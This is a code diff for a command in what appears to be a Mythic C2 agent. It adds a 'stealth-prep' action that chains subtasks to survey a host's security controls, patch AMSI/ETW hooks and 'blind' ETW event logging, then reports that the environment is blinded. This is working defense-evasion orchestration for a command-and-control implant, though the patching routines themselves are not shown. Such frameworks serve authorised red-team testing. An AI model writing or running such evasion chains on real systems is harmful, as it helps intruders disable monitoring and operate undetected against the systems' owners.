@@ -7,6 +7,7 @@ import (
 	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
 func init() {
@@ -18,7 +19,7 @@ func init() {
 		},
 		Description:         "Report security posture and active controls, or detect installed EDR/XDR products. Linux: SELinux, AppArmor, seccomp, ASLR, YAMA, LSM, BPF. macOS: SIP, Gatekeeper, FileVault, MDM, TCC, SSH, JAMF, ARD. Windows: Defender, Credential Guard, UAC, BitLocker, CLM.",
 		HelpString:          "security-info [-action all|edr]",
-		Version:             3,
+		Version:             4,
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1082", "T1518.001"},
 		CommandAttributes: agentstructs.CommandAttribute{
@@ -28,13 +29,18 @@ func init() {
 				agentstructs.SUPPORTED_OS_MACOS,
 			},
 		},
+		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
+			"stealthPrepSecInfoDone": stealthPrepSecInfoDone,
+			"stealthPrepAutopatchDone": stealthPrepAutopatchDone,
+			"stealthPrepEtwDone": stealthPrepEtwDone,
+		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
 				Name:             "action",
 				ModalDisplayName: "Action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Description:      "all: report security posture (default). edr: detect installed EDR/XDR/AV products.",
-				Choices:          []string{"all", "edr"},
+				Description:      "all: report security posture (default). edr: detect installed EDR/XDR/AV products. stealth-prep: automated stealth chain (security-info → autopatch → etw blind).",
+				Choices:          []string{"all", "edr", "stealth-prep"},
 				DefaultValue:     "all",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -69,6 +75,34 @@ func init() {
 			if action == "" {
 				action = "all"
 			}
+
+			if action == "stealth-prep" {
+				display := "Stealth Prep Chain (security-info → autopatch → etw blind)"
+				response.DisplayParams = &display
+
+				// Step 1: Run security-info to assess environment
+				callbackFunc := "stealthPrepSecInfoDone"
+				secInfoParams, _ := json.Marshal(map[string]string{"action": "all"})
+				_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
+					mythicrpc.MythicRPCTaskCreateSubtaskMessage{
+						TaskID:                  taskData.Task.ID,
+						SubtaskCallbackFunction: &callbackFunc,
+						CommandName:             "security-info",
+						Params:                  string(secInfoParams),
+					},
+				)
+				if err != nil {
+					response.Success = false
+					errMsg := fmt.Sprintf("Failed to create security-info subtask: %v", err)
+					response.Error = errMsg
+					return response
+				}
+
+				createArtifact(taskData.Task.ID, "Subtask Chain",
+					"Stealth Prep: security-info → autopatch → etw blind (sequential)")
+				return response
+			}
+
 			display := fmt.Sprintf("action: %s", action)
 			response.DisplayParams = &display
 
@@ -134,4 +168,131 @@ func init() {
 			return response
 		},
 	})
+}
+
+// stealthPrepSecInfoDone handles security-info completion → triggers autopatch
+func stealthPrepSecInfoDone(
+	taskData *agentstructs.PTTaskMessageAllData,
+	subtaskData *agentstructs.PTTaskMessageAllData,
+	groupName *agentstructs.SubtaskGroupName,
+) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
+		TaskID:  taskData.Task.ID,
+		Success: true,
+	}
+
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   taskData.Task.ID,
+		Response: []byte("[1/3] Security-info complete. Proceeding to autopatch..."),
+	})
+
+	// Step 2: Run autopatch to patch AMSI/ETW hooks
+	callbackFunc := "stealthPrepAutopatchDone"
+	autopatchParams, _ := json.Marshal(map[string]string{})
+	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
+		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
+			TaskID:                  taskData.Task.ID,
+			SubtaskCallbackFunction: &callbackFunc,
+			CommandName:             "autopatch",
+			Params:                  string(autopatchParams),
+		},
+	)
+	if err != nil {
+		response.Success = false
+		errMsg := fmt.Sprintf("Failed to create autopatch subtask: %v", err)
+		response.Error = errMsg
+	}
+
+	return response
+}
+
+// stealthPrepAutopatchDone handles autopatch completion → triggers etw blind
+func stealthPrepAutopatchDone(
+	taskData *agentstructs.PTTaskMessageAllData,
+	subtaskData *agentstructs.PTTaskMessageAllData,
+	groupName *agentstructs.SubtaskGroupName,
+) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
+		TaskID:  taskData.Task.ID,
+		Success: true,
+	}
+
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   taskData.Task.ID,
+		Response: []byte("[2/3] Autopatch complete. Proceeding to ETW blind..."),
+	})
+
+	// Step 3: Run etw blind to disable ETW logging
+	callbackFunc := "stealthPrepEtwDone"
+	etwParams, _ := json.Marshal(map[string]string{"action": "blind"})
+	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
+		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
+			TaskID:                  taskData.Task.ID,
+			SubtaskCallbackFunction: &callbackFunc,
+			CommandName:             "etw",
+			Params:                  string(etwParams),
+		},
+	)
+	if err != nil {
+		response.Success = false
+		errMsg := fmt.Sprintf("Failed to create etw subtask: %v", err)
+		response.Error = errMsg
+	}
+
+	return response
+}
+
+// stealthPrepEtwDone handles etw blind completion → aggregates final results
+func stealthPrepEtwDone(
+	taskData *agentstructs.PTTaskMessageAllData,
+	subtaskData *agentstructs.PTTaskMessageAllData,
+	groupName *agentstructs.SubtaskGroupName,
+) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
+		TaskID:  taskData.Task.ID,
+		Success: true,
+	}
+
+	parentID := taskData.Task.ID
+	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
+		TaskID:             parentID,
+		SearchParentTaskID: &parentID,
+	})
+
+	var summaryParts []string
+	successCount := 0
+	errorCount := 0
+
+	if err == nil && searchResult.Success {
+		for _, task := range searchResult.Tasks {
+			status := "UNKNOWN"
+			if task.Completed {
+				if task.Status == "error" {
+					status = "ERROR"
+					errorCount++
+				} else {
+					status = "SUCCESS"
+					successCount++
+				}
+			}
+			summaryParts = append(summaryParts, fmt.Sprintf("[%s] %s: %s", status, task.CommandName, task.DisplayParams))
+		}
+	}
+
+	completed := true
+	response.Completed = &completed
+
+	summary := fmt.Sprintf("=== Stealth Environment Preparation Complete ===\nSteps: %d success, %d errors\n\n%s\n\nEnvironment should now have:\n  - AMSI hooks patched (autopatch)\n  - ETW event logging blinded (etw blind)\n  - Security posture documented (security-info)",
+		successCount, errorCount, strings.Join(summaryParts, "\n"))
+	response.Stdout = &summary
+
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   parentID,
+		Response: []byte(summary),
+	})
+
+	logOperationEvent(parentID,
+		fmt.Sprintf("[STEALTH] Stealth prep chain complete on %s (%d/%d steps succeeded)", taskData.Callback.Host, successCount, successCount+errorCount), true)
+
+	return response
 }
